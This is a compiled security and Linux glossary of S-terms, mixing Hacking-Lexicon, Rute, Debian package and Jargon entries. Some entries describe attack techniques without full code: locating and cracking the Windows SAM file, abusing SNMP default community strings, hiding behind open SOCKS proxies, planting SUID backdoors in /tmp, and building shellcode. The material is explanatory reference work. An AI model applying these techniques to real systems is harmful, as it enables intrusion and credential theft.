>&#13;On Microsoft Windows 2000 (and Windows NT), all the user account information is stored within the SAM. It exists as a single file on the disk. The SAM is the primary target when hackers break into a system because it can be run through a password cracker. Key point: The SAM file is located in the path %systemroot%/system32/config/SAM However, a backup is also stored in the location %systemroot%/repair/sam._ as well as on any repair disk generated. (Note: if new repair disks haven't been created, then you'll likely only be able to see the Administrator's password there). Hackers usually go after the "repair" versions because they are not locked by the operating system. Tools: pwdump/pwdump2 Dumps the current password information using Windows registry calls. Must have administrative access for this to work. The data is written in a format for crack programs. samdump Reads the password information from the SAM file in a format suitable for inputting into crack programs. l0phtcrack The most popular utility for cracking Windows passwords. All these tools are available at http://www.l0pht.com/. History: The original version of WinNT allowed the password hashes to be easily retrieved, making cracking easy. In SP3, an optional utility called SYSKEY was added that encrypts the hashes. In order to decrypt them, the administrator needs to either type in the passphrase at boot time, store the passphrase on a floppy, or put the passphrase in the registry (dramatically reducing security, of course). Whatever way is used to boot the system, the keys are then stored in unencrypted format in memory, so administrative access can still read them (using the pwdump2 utility). SYSKEY is optional on WinNT, but is always running on Win2k. Key point: The PASSPROP and PASSFILT utilities can be used to enforce the choice of better passwords. From Hacking-Lexicon

>&#13;SCSI disks

>&#13;SCSI (pronounced scuzzy) stands for Small Computer System Interface. SCSI is a ribbon, a specification, and an electronic protocol for communication between devices and computers. Like your IDE ribbons, SCSI ribbons can connect to their own SCSI hard disks. SCSI ribbons have gone through some versions to make SCSI faster, the latest ``Ultra-Wide'' SCSI ribbons are thin, with a dense array of pins. Unlike your IDE, SCSI can also connect tape drives, scanners, and many other types of peripherals. SCSI theoretically allows multiple computers to share the same device, although I have not seen this implemented in practice. Because many UNIX hardware platforms only support SCSI, it has become an integral part of UNIX operating systems.  SCSIs also introduce the concept of LUNs (which stands for Logical Unit Number), Buses, and ID. These are just numbers given to each device in order of the SCSI cards you are using (if more than one), the SCSI cables on those cards, and the SCSI devices on those cables--the SCSI standard was designed to support a great many of these. The kernel assigns each SCSI drive in sequence as it finds them: /dev/sda, /dev/sdb, and so on, so these details are usually irrelevant. An enormous amount should be said on SCSI, but the bare bones is that for 90% of situations, insmod &#60;pci-scsi-driver&#62; is all you are going to need. You can then immediately begin accessing the device through /dev/sd? for disks, /dev/st? for tapes, /dev/scd? for CD-ROMs, or /dev/sg? for scanners. [Scanner user programs will have docs on what devices they access.] SCSIs often also come with their own BIOS that you can enter on startup (like your CMOS). This will enable you to set certain things. In some cases, where your distribution compiles-out certain modules, you may have to load one of sd_mod.o, st.o, sr_mod.o, or sg.o, respectively. The core scsi_mod.o module may also need loading, and /dev/ devices may need to be created. From Rute-Users-Guide

Contrast: SHA-1 is currently (year 2001) considered to be the strongest hash function available. It has a larger size (160-bits vs. 128-bits) and has underground thorough scrutiny without discovery of weaknesses (such as MD5). On the other hand, it is one of the slower hash algorithms. History: SHA-1 is a slight variation of SHA. It adds a one-bit shift at one stage in order to overcome a theoretical weakness. SHA was based upon MD4, enhanced to overcome known weaknesses and increase the length to 160-bits. See also: integrity From Hacking-Lexicon

Secure HTTP provides this support in two ways by assuring vendors that the customers attempting to buy the vendors' wares are who they say they are (authentication) and by encrypting sensitive information, such as credit-card numbers , so that it cannot be intercepted while en route. Secure HTTP was developed by Enterprise Integration Technology (EIT) and the National Center Supercomputing Applications (NCSA), with subsequent commercial development by Terisa system. Netscape communications developed a competing security technology , the Secure Sockets Layer (SSL) protocol. The two security protocols are  incompatible, and for a time it was feared that no single widely accepted security protocol would emerge. In early 1995, however    Netscape invested heavily in Terisa Systems and announced that it would integrate Secure HTTTP and SSL to provide the Web community with a single security protocol that will work with any security-capable browser.

>&#13;Introduction This is the SMB HOWTO. This document describes how to use the Server Message Block (SMB) protocol, also called the Session Message Block, NetBIOS or LanManager protocol, with Linux using Samba. Although this document is Linux-centric, Samba runs on most Unix-like operating systems. This document is maintained by David Wood ( dwood@plugged.net.au). Additions, modifications or corrections may be mailed there for inclusion in the next release. Much more Samba documentation is available at the Samba Web site, located at http://www.samba.org/. There is a tremendous amount of information there; please have a look before asking for help! You also might try the comp.protocols.smb newsgroup. The SMB protocol is used by Microsoft Windows 3.11, NT and 95/98 to share disks and printers. Using the Samba suite of tools by Andrew Tridgell ( Andrew.Tridgell@anu.edu.au), UNIX (including Linux) machines can share disk and printers with Windows hosts. The smbfs tools by Paal-Kr. Engstad ( engstad@intermetrics.com) and Volker Lendecke ( lendecke@namu01.gwdg.de) enable Unix machines to mount SMB shares from Windows or Samba hosts. There are four basic things that one can do with Samba: Share a Linux drive with Windows machines. Access an SMB share with Linux machines. Share a Linux printer with Windows machines. Share a Windows printer with Linux machines. All of these are covered in this document, plus a few other odds and ends. Disclaimer: The procedures and scripts either work for the author or have been reported to work by the people that provided them. Different configurations may not work with the information given here. If you encounter such a situation, please e-mail the author with suggestions for improvement in this document. Please note that for Windows 3.x machines to access SMB shares, they must have a TCP/IP stack and the Win32s DLLs. Both of these are available on Microsoft's Web site ( http://www.microsoft.com). As of the writing of this version of the HOWTO, Microsoft are reportedly requiring a subscription to the Microsoft Software Developers Network (MSDN) to download the TCP/IP-32 stack for Windows 3.x from their Web site. Since this software used to be free, many older copies are in existance and may be acquired from friends and user group contacts. From SMB-HOWTO

>&#13;SMB is the protocol used by Microsoft for file and print sharing. SMB stands for Server Message Block, though that doesn't really mean anything. SMB runs on top of NetBIOS, though in Win2k it can bypass NetBIOS. History: SMB was originally developed for DOS machines. It was later upgraded so that OS/2 machines could act as servers for DOS machines. The protocol was later upgraded for Windows (Wfw = Windows for Workgroups) and Windows NT. Still later upgrades have been added for Windows 2000. This constant evolution and need for backwards compatibility has led to many security holes within the protocol. The most severe is the need for "LAN Manager" authentication. Key point: SMB is an application layer protocol and can run over many different transports, including TCP/IP. A common problem is that home-users enable SMB over TCP/IP, allowing anybody on the Internet to access their hard-disk. They should instead install a local-only transport such as NetBEUI for SMB, which will allow file access among local machines, but not remote machines across the Internet. Key point: SMB-sniffers can read the encrypted password info off the wire and send them to password crackers. From Hacking-Lexicon

Key point: Most equipment comes with default passwords (aka. community strings) of public and private. These allow you to read information from the device (traffic, temperature, voltage, etc.) and re-configure it. Key point: A common technique is to traceroute to a victim's dial-up machine thereby discovering the IP address of the hardware they've dialed into. Then, you can send SNMP commands with the "private" community strings telling the hardware to hang-up on the victim. Also, spammers have used this technique to find the true login name of the user.

>&#13;SOCKS is a service that allows internal machines behind a firewall/proxy/gateway access to the Internet. Rather than talking to the target machine, clients communicate with the SOCKS server and ask it to relay data to the target machine out on the Internet. Most web-browsers and FTP clients have SOCKS support built in; SOCKS clients can also be installed on client computers to automatically redirect traffic through the socks gateway. Key point: SOCKS servers are frequently misconfigured allowing both outside and inside people to use them. This means that if a hacker wants to hide where they come from, the hacker scans the Internet for SOCKS proxies, then funnel their data through the proxies they find. When victims trace back to the hacker's IP address, they find the open SOCKS server instead. Key point: Abuse through SOCKS servers has become so common on IRC networks that many of them (dalnet, undernet) have begun scanning clients to see if they are running an open SOCKS proxy. They deny access to anybody coming into the networks through such a proxy. Note that users can still use closed proxies (i.e. those available only to internal users). Key point: SOCKS servers listen by default on TCP port 1080. Real world: Most browsers support SOCKS, which you can see in the "proxy" settings configuration tab. You can download generic SOCKS clients and servers from http://www.socks.nec.com/. SOCKS v5 is specified in RFRC 1928. From Hacking-Lexicon

SSH replaces the old Telnet application, and can be used for secure remote administration of machines across the Internet. However, it also has other features. SSH increases the ease of running applications remotely by setting up X permissions automatically. If you can log into a machine, it allows you to run a graphical application on it, unlikt Telnet, which requires users to have an understanding of the X authentication mechanisms that are manipulated through the xauth and xhost commands. SSH also has inbuilt compression, which allows your graphic applications to run much faster over the network. SCP (Secure Copy) and SFTP (Secure FTP) allow transfer of files over the remote link, either via SSH's own command line utilities or graphical tools like Gnome's GFTP. Like Telnet, SSH is cross-platform. You can find SSH server and clients for Linux, Unix and all flavours of Windows, BeOS, PalmOS, Java and embedded Oses used in routers.

>&#13;Provides a "secure" (i.e. encrypted connection) between the web-browser and the web-server so that the data cannot be sniffed. SSL is used primarily for HTTP, but can also be used for other protocols such as FTP or Telnet. SSL provides three key features: digital-signatures to verify the identity of both the client and server, encryption to prevent the eavesdropping of data, and hashing to protect the integrity of the data. Key point: Web servers have a certificate signed by a trusted certificate authority (CA). This certificate allows the client and the server to generate random keys for the session and to exchange them securely (to defend against man-in-the-middle attacks). The generated random key is used to encrypt the rest of the contents of the connection, usually using RC4. U.S. export controls attempts to limit products used abroad to only 40-bits of key length, which can easily be broken. Key point: In SSL, the server first authenticates itself with the client (a technique that makes it more likely that e-commerce vendors are reputable). Therefore, if you want to set up your own SSL-based web server, you need to get a signed certificate from a CA. Furthermore, if you are outside the U.S., you will find it difficult to find one for 128-bits, though the Chaos Computer Club in Germany manages nicely. Key point: The chief reason SSL isn't used more widely is because it creates a huge performance hit on servers. In particular, the biggest hit comes from handling the public keys in the certificate, though normal encryption/decryption also plays a role. Hardware acceleration for both the public key cryptography and symmetric cryptography are becoming more and more popular. History: SSL was originally developed by Netscape to promote e-commerce. It is also known under the IETF standard name of TLS (Transport Layer Security) and the URL https://. History: In 1996, Netscape's implementation was found to be deeply flawed (i.e. crackable) because of problems in the random number generator. It seeded the generator with the time in seconds and milliseconds as well as the PID (process ID) and PPID (parent process ID). Since these numbers are easy to guess, it gives the random symmetric session key a complexity of roughly 20-bits, which can be easily be brute forced. Subsequent sessions are not re-seeded, which means the discovery of the PRNG seed only needs to be discovered once. Point: SSL allows the encryption algorithm to be negotiated (also known as the "cipher"). Some possible ciphers for SSL are: RC2 with 40-bit keys. RC4 with 40-bit keys. RC4 with 128-bit keys. DES with 40-bit keys. DES with 56-bit keys. Triple-DES with 112/168-bit keys. IDEA with 128-bit keys. Fortezza with 96-bit keys.

Applications that use SSL use public key encryption to ensure that, while information is being conveyed through the Internet, no one can intercept that information. Netscape Communications has released the SSL specification to the Internet community as an open standard. Terisa Systems is currently developing a hybrid SSL/Secure H'TTP specification that ensures that any browser with security features can access any secure Web site. See public key cryptography. security The protection of data so unauthorized users cannot examine or copy it. Mainframe computer systems ensured security by keeping the computer and its mass storage media under lock and key, and allowing access only through remote terminals equipped with displays but no disk drives. Although some experts argue that personal computer local area networks (LANs) should be set up the same way, the excessive centralization of mainframe computer systems was one of the main reasons for the development of personal computers. Concern for security shouldn't prevent a manager from distributing computing power-and computing autonomy-to subordinates.

>&#13;A SYN flood is a type of DoS attack. A SYN packet notifies a server of a new connection. The server then allocates some memory in order to handle the incoming connection, sends back an acknowledgement, then waits for the client to complete the connection and start sending data. By spoofing large numbers of SYN requests, an attacker can fill up memory on the server, which will sit their waiting for more data that never will arrive. Once memory has filled up, the server will be unable to accept connections from legitimate clients. This effectively disables the server. Key point: SYN floods exploit a flaw in the core of the TCP/IP technology itself. There is no complete defense against this attack. There are, however, partial defenses. Servers can be configured to reserve more memory and decrease the amount of time they wait for connections to complete. Likewise, routers and firewalls can filter out some of the spoofed SYN packets. Finally, there are techniques (such as "SYN cookies") that can play tricks with the protocol in order to help distinguish good SYNs from bad ones. From Hacking-Lexicon

This indicates that the file is a soft link (also known as a symbolic link or symlink) to some other file.  A symbolic link contains no data of its own, only a reference to another file. It can even contain a reference to a directory. In either case, programs operating on the link will actually see the file or directory it points to. One of the common uses of symbolic links is to make mounted (see Section 19.4) file systems accessible from a different directory. For instance, you may have a large directory that has to be split over several physical disks. For clarity, you can mount the disks as /disk1, /disk2, etc., and then link the various subdirectories in a way that makes efficient use of the space you have. Another example is the linking of /dev/cdrom to, say, /dev/hdc so that programs accessing the device file /dev/cdrom (see Chapter 18) actually access the correct IDE drive. From Rute-Users-Guide

>&#13;An Object-Oriented Compiler Framework SableCC is an object-oriented framework that generates compilers (and interpreters) in the Java programming language. This framework is based on two fundamental design decisions. Firstly, the framework uses object-oriented techniques to automatically build a strictly typed abstract syntax tree that matches the grammar of the compiled language and simplifies debugging. Secondly, the framework generates tree-walker classes using an extended version of the visitor design pattern which enables the implementation of actions on the nodes of the abstract syntax tree using inheritance. These two design decisions lead to a tool that supports a shorter development cycle for constructing compilers. From Debian 3.0r0 APT

This protocol is sometimes also referred to as the LanManager or NetBIOS protocol. This package contains all the components necessary to turn your Debian GNU/Linux box into a powerful file and printer server. Currently, the Samba Debian packages consist of the following:  samba - A LanManager like file and printer server for Unix.  samba-common - Samba common files used by both the server and the client.  smbclient - A LanManager like simple client for Unix.  swat - Samba Web Administration Tool  samba-doc - Samba documentation.  smbfs - Mount and umount commands for the smbfs (kernels 2.0.x and above).  libpam-smbpass - pluggable authentication module for SMB password database  libsmbclient - Shared library that allows applications to talk to SMB servers  libsmbclient-dev - libsmbclient shared libraries  winbind: Service to resolve user and group information from Windows NT servers It is possible to install a subset of these packages depending on your particular needs. For example, to access other SMB servers you should only need the smbclient and samba-common packages. From Debian 3.0r0 APT

>&#13;A "sandbox" is a mode of running a program that prevents it from having full access to the rest of the system. This is especially important for mobile code such as Java. A client can trust the code automatically downloaded from a web-site if the code runs in a sandbox and cannot harm the rest of the system. Key point: Sandboxes are being used more and more often for servers. This puts walls between different components that can help stop (or slow down) an intruder that has broken into one part of the system. The most important technique is to run services as a user account rather than an administrator/root account. For example, Microsoft's IIS creates a special user account (named "IUSR_XXXX" where XXXX is the system name) that the web-server runs under. When somebody breaks into the web-server, they still cannot gain control over the full system (unless they run some sort of local exploit in order to break out of this sandbox). Example: Example sandboxes are: user accounts As described above, running services under a user account prevents an intruder from gaining control over the entire machine. jail/chroot These utilities limit the view of the filesystem from a program. A program that runs under a chroot environment can only its own subdirectory, but no other parts of the filesystem. virtual machine The technique used by Java is to create an entirely separate "virtual" machine. A Java program has absolutely no access to the real machine except in a few places. A more extensive version of this is software like VMware or SoftPC that creates an entire virtual computer. Using VMware, you can boot a Linux or Windows virtual machine under the real machines. If an intruder compromises the virtual machine, he/she still cannot access the real machine.

That description is not totally accurate, but it does cover one of the more important jobs that the sanitizer can do for you - it can scan email attachments for viruses. Other things it can do: Disable potentially dangerous HTML code, such as javascript, within incoming email. Protect you from email-based break-in attempts which exploit bugs in common email programs (Outlook, Eudora, Pine, ...). Block or "mangle" attachments based on their file names. This way if you don't *need* to receive e.g. visual basic scripts, then you don't have to worry about the security risk they imply (the ILOVEYOU virus was a visual basic program). This lets you protect yourself and your users from whole classes of attacks, without relying on complex, resource intensive and outdated virus scanning solutions. From Debian 3.0r0 APT

>&#13;(alt. `security by obscurity') A term applied by hackers to most OS vendors' favorite way of coping with security holes -- namely, ignoring them, documenting neither any known holes nor the underlying security algorithms, trusting that nobody will find out about them and that people who do find out about them won't exploit them. This "strategy" never works for long and occasionally sets the world up for debacles like the RTM worm of 1988 (see Great Worm), but once the brief moments of panic created by such events subside most vendors are all too willing to turn over and go back to sleep. After all, actually fixing the bugs would siphon off the resources needed to implement the next user-interface frill on marketing's wish list -- and besides, if they started fixing security bugs customers might begin to expect it and imagine that their warranties of merchantability gave them some sort of right to a system with fewer holes in it than a shotgunned Swiss cheese, and then where would we be? Historical note: There are conflicting stories about the origin of this term. It has been claimed that it was first used in the Usenet newsgroup in comp.sys.apollo during a campaign to get HP/Apollo to fix security problems in its Unix-clone Aegis/DomainOS (they didn't change a thing). ITS fans, on the other hand, say it was coined years earlier in opposition to the incredibly paranoid Multics people down the hall, for whom security was everything. In the ITS culture it referred to (1) the fact that by the time a tourist figured out how to make trouble he'd generally gotten over the urge to make it, because he felt part of the community; and (2) (self-mockingly) the poor coverage of the documentation and obscurity of many commands. One instance of deliberate security through obscurity is recorded; the command to allow patching the running ITS system (escape escape control-R) echoed as $$^D. If you actually typed alt alt ^D, that set a flag that would prevent patching the system even if you later got it right.  From Jargon Dictionary

>&#13;A powerful, efficient, and scalable Mail Transport Agent. Sendmail is an alternative Mail Transport Agent (MTA) for Debian. It is suitable for handling sophisticated mail configurations, although this means that its configuration can also be complex. Fortunately, easy thing can be done easily, and complex things are possible, even if not easily understood ;)  Sendmail is the *ONLY* MTA with a Turing complete language under the covers ! Sendmail provides Security and SPAM/UCE/UBE protection via several means:  - STARTTLS(SSL) RFC2487 encryption for mail reception/delivery.  - STARTTLS(SSL) authentication (certificate based) for access/relay control.  - SMTP AUTH (SASL/PAM) authentication for access/relay control.  - ACCESS database (by IP/host) for access/relay control.  - Use of varied Realtime Blackhole Lists (RBL) to prevent access.  - Integration of LOGCHECK rules to fine-tune logging.  - Inboard POSIX Regular Expression processing of *all* headers.  - Ability (via MILTER) to scan/change headers *and* body of *ALL* mail    A site may utilize zero, one, or more MILTERs.  - Reduced SUID exposures by running SGID smmsp/mail where possible. Sendmail provides Performance and Scalability by:  - Allowing multiple queues, with the ability to tune both interval and    queue runners on a queue by queue basis.  - Providing (a Debian exclusive) an easy to configure means of queue-aging    to improve throughput by not continually retrying failed deliveries.  - Allowing most all maps/databases to be obtained via LDAP; reducing the    number of used databases and simplifying the maintenance of Sendmail.  - Reducing the file I/O where possible by buffering files in memory. Sendmail provides site enhanced site configuration/customization by:  - Allowing the listener (usually port 25) to run as a daemon or via INETD.  - Allowing the queue runner (mail delivery) to run as a daemon or via CRON.  - Automagically updating configuration and databases on upgrades.  - Providing a Turing complete language for site customization of mail    handling.  - Providing a means (MILTER) for a site to scan/change all email - both    incoming and outgoing.  A site can write their own MILTER, or may use    any of those found on internet.  To write your own MILTER, you'll need    to install the optional milter-dev package.  - Providing extensive documentation via the sendmail-doc (optional) package.  - Providing an inboard Mail Delivery Agent (MDA) (mail.local), but supporting    procmail, mailagent, maildrop, or deliver automatically if installed.    Sendmail will also deliver to anythings else (cyrus, etc) if asked to. Sendmail includes *no* Mail User Agents (MUA), you'll have to pick from the plethora of available MUAs (pine, mutt, vm, etc.) This package supports REGEX, DB, NIS, NIS+, LDAP, DNS, HESIOD maps, and has enabled TCPWrappers, IPv6, LockFile, SMTP AUTH(SASL), STARTTLS(SSL).

>&#13;Sendmail is a popular e-mail server package. By most estimates, well over half of all e-mail flowing through the Internet goes through a Sendmail system. Sendmail is open-source software. Key point: Sendmail is an MTA (Message Transfer Agent). This means that Sendmail only transfers e-mail to other MTAs. Client programs (like Outlook, Eudora, Pine) will use SMTP to hand e-mail to Sendmail for transmission over the Internet, but they can't use SMTP to read e-mail. Instead, when Sendmail receives e-mail destined for the local machine, it must hand it off to some other software package. In the most common situation, Sendmail will save incoming messages in mbox format to /var/spool/mail for each user, and other programs will allow users to retrieve e-mail from those files. History: In 1989, Morris Worm exploited Sendmail bugs as one technique to spread itself. Sendmail is an ancient software package on the Internet, which results in a high-degree of complexity for backwards compatibility. From Hacking-Lexicon

>&#13;UNIX programs that can be run by a user, but which have root privileges. Key point: In theory, setuid programs can only be installed by root, and they are considered as part of the operating system, because they inherently bypass security checks and must verify security themselves. A typical example is the passwd command, which a user runs in order to change his/her password. It must be setuid, because it changes files only root has access to, but yet it must be runnable by users. Key point: In practice, setuid programs often have bugs that can be exploited by logged in users. Key point: As part of hardening a system, the administrator should scour the system and remove all unnecessary setuid programs. Linux find / -type f -perm +6000 -exec ls -l {} \; Solaris find / -type f \( -perm -4000 -o -perm -2000 \) -exec ls -l {} \; In order to remove the suid bit, you can use the command chmod -s filename. Removing the suid bit will disable a lot of programs. Two programs that really need to have this bit turned on are /usr/bin/passwd, which users run to change their passwords, and /bin/su, which elevates a normal user to super user (when given the correct password). Key point: Some programs are really setguid which only changes the group context rather than the user context. Key point: Windows doesn't have the concept of setuid. Instead, RPC is used whereby client programs (run by users) contact server programs to carry out the desired task. For example, in order to change the password, the client program asks the SAM to do it on behalf of the user. Thus, whereas UNIX requires a myriad of client programs to verify credentials and be written securely, Windows only requires a few server programs to do the same. Key point: A common way to backdoor a system is to place a SUID program in the /tmp directory. From Hacking-Lexicon

>&#13;Utilities for working with generic SCSI devices. This package includes a number of utilities to manipulate the linux "sg" (version 2) device driver, and to a lesser extent, the version 1 driver found in the 2.0.x kernels. The version 2 driver is only found in 2.2.x linux kernels; if you are using 2.4, please install the sg3-utils package instead. The package includes:     * isosize - gives the number of bytes in an iso9660 filesystem     * scsi_inquiry - same as sg_inq, only uses SCSI_IOCTL_SEND_COMMAND     * sg_dd - a variant of 'dd' that works with the sg interface     * sg_debug - prints debug info for all open sg file descriptors     * sg_inq - a utility for poking around with the SCSI INQUIRY command     * sg_map - shows the mapping between SCSI devices and sg devices     * sg_rbuf - tests SCSI bus speed     * sg_readcap - prints the output of a READ CAPACITY command     * sg_runt_ex - an example program to test the sg driver version     * sg_scan - displays the SCSI bus on stdout     * sg_start - spins up (or down) disks     * sg_test_rwbuf - tests the SCSI host adapter     * sg_turs - execute a TEST UNIT READY command on the given device     * sg_whoami - displays information about the given sg device     * sginfo - a re-porting of the 'scsiinfo' program to use sg devices     * sgp_dd - like sg_dd, only multithreaded It also includes sg_simple1 and sg_simple2, which demonstrate calls to the SCSI INQUIRY and TEST UNIT READY commands.

>&#13;convert DocBook SGML source into HTML using DSSSL A text-formatting package based on SGML (Standard Generalized Markup Language), which allows you to produce TeX/DVI/PS/PDF, HTML, RTF, and plain ASCII (currently via w3m by default) from a single source with other recommended and suggested packages; due to the flexible nature of SGML, many other target formats are possible. This tool can not handle DocBook XML yet.  For DocBook SGML only. HTML can be generated without any other Debian text processing package, but for the other formats the appropriate packages have to be installed. You need to install lynx or w3m for ASCII text output (w3m is the default txt backend).  Also jadetex is required for PS and PDF, and linuxdoc-tools for ld2db conversion. This system is tailored for writing technical software documentation, an example of which are the Linux HOWTO documents.  However, there is nothing Linux-specific about this package; it can be used for many other types of documentation on many other systems.  It should be useful for all kinds of printed and online documentation. The package was formerly called linuxdoc-sgml because it originates from the Linux Documentation Project (LDP).  The name has been changed into sgmltools to make it clearer that there is no Linux-specific stuff included in this package. This is the latest version of the sgmltools series and the successor of sgmltools v2. From Debian 3.0r0 APT

>&#13;UNIX was designed around the concept of making the encrypted form of passwords readable by everyone. These passwords were stored in the /etc/passwd file, along with the full account information. It was thought to be secure because the passwords were stored in an encrypted format within this file. However, this is not secure in practice because users tend to choose easily guessable passwords. A program called crack was developed that would guess dictionary words (/usr/dict) and then attempt to brute force the passwords. On an average UNIX system, 90% of all passwords could be cracked with a few days worth of computing time. In order to solve this problem, a "shadow" password file was developed. The encrypted passwords are removed from the normal /etc/passwd and placed in a special file (usually /etc/shadow) that is only readable by root. The remaining account information is left in the original password file for backwards compatibility. Example: The following is a table of typical locations for the shadowed passwords: AIX 3  /etc/security/passwd or /tcb/auth/files// A/UX 3.0s  /tcb/files/auth/?/ BSD4.3-Reno  /etc/master.passwd ConvexOS 10  /etc/shadpw  ConvexOS 11  /etc/shadow  DG/UX  /etc/tcb/aa/user/  EP/IX  /etc/shadow  HP-UX  /.secure/etc/passwd IRIX 5  /etc/shadow  Linux  /etc/shadow  OSF/1  /etc/passwd[.dir|.pag] SCO Unix #.2.x  /tcb/auth/files// SunOS4.1+c2  /etc/security/passwd.adjunct SunOS 5.0  /etc/shadow System V Release 4.0 /etc/shadow System V Release 4.2 /etc/security/* database Ultrix 4  /etc/auth.dir or /etc/auth.pag UNICOS  /etc/udb Key point: In the old days, most remote attacks against UNIX were directed at the /etc/passwd file. For example, the most common form of the phf would be to grab the password file. As password shadowing becomes more common, such attacks are increasingly being pointed at the shadow password file instead. From Hacking-Lexicon

>&#13;The idea that many people share the same password or key. Shared secrets are widely use because they are easy: there is simply one password to give out. On the other hand, the more widely secrets are shared, the more likely it will become compromised. In fact, many people believe that even sharing a secret among two people is extremely risky, where the proper solution is using public keys to distribute a randomly generated key only valid for the particular message. Example: DVD movies are encrypted with a randomly generated key. This key is then is then encrypted multiple times with hundreds of different keys. Every DVD player vendor owns one of these keys and imbeds it in their device, thus allows that player to decrypt the movie. (Presumably, if one of the keys is compromised, future movies can be generated without the offending key, causing players based upon that key to become obsolete). However, there is no good way to protect these keys, even though they are in hardware. In late 1999, students in Europe where able to break one of these keys (the Xing software DVD player), and from there they were able to break the majority of the other keys.

>&#13;The default command-line interface on UNIX systems. Key point: This is similar to the "Command Prompt" or incorrectly named "DOS Prompt" on Windows systems. Key point: Many systems pass filenames along with commands directly to the shell. Hackers can exploit this by sending special shell characters (like the pipe | character) as part of filenames in order to execute their own commands. This is an example of an input validation exploit. Examples of this are web-servers, PERL scripts, and CGI scripts. Key point: The most popular shell among hackers is probably "bash", the shell from GNU that ships with Linux. (Culture: The original shell on UNIX is known as the "Bourne Shell", named for its creator. The acronym "bash" means "Bourne Again SHell", reflecting that fact that it is a rewrite of that shell). Key point: Retrieving someone's .bash_history file is a common attack against UNIX machines. Several embedded systems have shipped such that the file http://raq.robertgraham.com/~root/.bash_history could be retrieved via the web. Key point: The holy grail of UNIX hacking is to somehow obtain (or re-obtain) a root shell. In other words, the hacker wants to get a command-line on the victim system in order to carry out any task. For this reason, buffer overflow exploits often contain what is called "shell code". When the victim process is running with root privileges, the buffer-overflow will cause that process to begin running a shell. For example, an exploit might send a long password containing the shell code to an FTP server, converting the TCP connection to the FTP server into a full command-prompt from which any program can be launched.

>&#13;[orig. Multics n. techspeak, widely propagated via Unix] 1. [techspeak] The command interpreter used to pass commands to an operating system; so called because it is the part of the operating system that interfaces with the outside world. 2. More generally, any interface program that mediates access to a special resource or server for convenience, efficiency, or security reasons; for this meaning, the usage is usually `a shell around' whatever. This sort of program is also called a `wrapper'. 3. A skeleton program, created by hand or by another program (like, say, a parser generator), which provides the necessary incantations to set up some task and the control flow to drive it (the term driver is sometimes used synonymously). The user is meant to fill in whatever code is needed to get real work done. This usage is common in the AI and Microsoft Windows worlds, and confuses Unix hackers. Historical note: Apparently, the original Multics shell (sense 1) was so called because it was a shell (sense 3); it ran user programs not by starting up separate processes, but by dynamically linking the programs into its own code, calling them as subroutines, and then dynamically de-linking them on return.

With a command-line shell, the hacker will then be able to carry out any task they desire. However, opening shells within buffer overflow exploits can be difficult. Therefore, hackers often maintain libraries of "shellcode": code fragments for various operating systems that can be pasted into buffer overflow exploits. Key point: One of the difficulties in writing shellcode is that need to pass through filters. For example, when exploiting a bug in an SMTP server, you may find that the server strips the high-order bit from all bytes (i.e. will pass text but not binary). Therefore, all bytes between 0x00-07F will pass through, but not 0x80-0xFF. Alternately, a big limitation is systems that won't pass nul characters (0x00) because they terminate strings in functions like strcpy(). Therefore, when a hacker picks shellcode to append to their script, they must be fully aware of the limitations of the system they are dealing with. Key point: When creating new shellcode, create a C program that calls something like "system("/bin/sh");" or "execve("/bin/sh",0,0);" and grab the assembly output. At that point, pare it down to what you need. This requires extensive knowledge of assembly, needless to say. Key point: Sometimes you won't be able to grab a shell, so you have to create the exploit script to run a command. Typical choices of commands would be those that change passwords, add accounts, or in some fashion open up some other hole on the system. Key point: The vast majority of buffer overflow attacks will execute /bin/sh. Therefore, by simply removing this program (or replacing it with something that double-checks what's being done), you can protect yourself against many 0-day exploits. From Hacking-Lexicon

Entries marked as (everyone) allow anybody to log on. Key point: This command used the rpc.mountd protocol (RPC program number 100005). On most systems, these commands do not require authentication, which means that anybody can run them. The showmount command with no arguments equates the MOUNTPROG_DUMP procedure, whereas the -e option equates to the MOUNTPROG_EXPORT procedure. This protocol is extremely light-weight, only two packets in each direction are needed: one for the portmap, and one for the procedure call.

A scene is built up of objects which can be transformed with rotation, translation and scaling.  The objects form hierarchies where each object can have arbitrarily many subobjects and subsurfaces.  A surface is a number of connected polygons which are rendered with either Phong, Gouraud or flat shading.  An image can also be rendered as a line drawing of the polygon edges without any shading at all. The library supports texture mapping with textures in up to 3-dimensions and automatic interpolation of texture coordinates. Simple anti-aliasing can be performed through oversampling.  A scene can be illuminated by an arbitrary number of light sources and a number of different light sources are availaible.  The light from some of them are capable of casting shadows of objects.  A basic shading algorithm is provided with the library, but the user can also use his own shading algorithms for each surface to produce special effects. Objects can have varying degree of transparency, controlled by the shader. From Debian 3.0r0 APT

>&#13;A smart-card looks like a credit-card but contains an embedded microprocessor. The gold contact pad with roughly 8 contact points is visible on the outside of the card. As of the year 2000, typical circuits consisted of an 8-bit microprocessor running at 5MHz, 1K of RAM, and 16K of ROM with a 9.6-kbps half-duplex interface. (Much of the design of AES focused on being able to run within these stringent requirements). Key point: Whereas the data on the magnetic strip of a credit-card can be easily read or changed, smart-cards are designed to be tamper proof. Example: All Germans have a smart-card for health insurance. As of 2001, smart-cards have been popular in Europe for about a decade, but are still mostly unknown in the United States. Example: The tamper-proof features make it popular for authentication in both physical security and infosec uses. From Hacking-Lexicon

>&#13;n. 1. A terminal that has enough computing capability to render graphics or to offload some kind of front-end processing from the computer it talks to. The development of workstations and personal computers has made this term and the product it describes semi-obsolescent, but one may still hear variants of the phrase `act like a smart terminal' used to describe the behavior of workstations or PCs with respect to programs that execute almost entirely out of a remote server's storage, using local devices as displays. 2. obs. Any terminal with an addressable cursor; the opposite of a glass tty. Today, a terminal with merely an addressable cursor, but with none of the more-powerful features mentioned in sense 1, is called a dumb terminal. There is a classic quote from Rob Pike (inventor of the blit terminal): "A smart terminal is not a smartass terminal, but rather a terminal you can educate." This illustrates a common design problem: The attempt to make peripherals (or anything else) intelligent sometimes results in finicky, rigid `special features' that become just so much dead weight if you try to use the device in any way the designer didn't anticipate. Flexibility and programmability, on the other hand, are really smart. Compare hook.  From Jargon Dictionary

